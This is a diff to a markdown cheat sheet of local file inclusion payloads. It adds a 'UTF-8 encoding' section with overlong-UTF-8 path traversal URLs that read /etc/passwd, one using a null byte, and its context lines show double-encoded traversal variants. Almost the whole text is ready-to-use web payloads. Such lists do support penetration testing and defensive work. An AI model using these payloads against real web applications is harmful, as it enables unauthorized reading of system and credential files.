@@ -10,6 +10,7 @@
 * [Basic LFI](#basic-lfi)
     * [Null byte](#null-byte)
     * [Double encoding](#double-encoding)
+    * [UTF-8 encoding](#utf-8-encoding)
     * [Path and dot truncation](#path-and-dot-truncation)
     * [Filter bypass tricks](#filter-bypass-tricks)
 * [Basic RFI](#basic-rfi)
@@ -56,6 +57,13 @@ http://example.com/index.php?page=../../../etc/passwd%00
 ```powershell
 http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
 http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
+```
+
+### UTF-8 encoding
+
+```powershell
+http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
+http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00
 ```
 
 ### Path and dot truncation
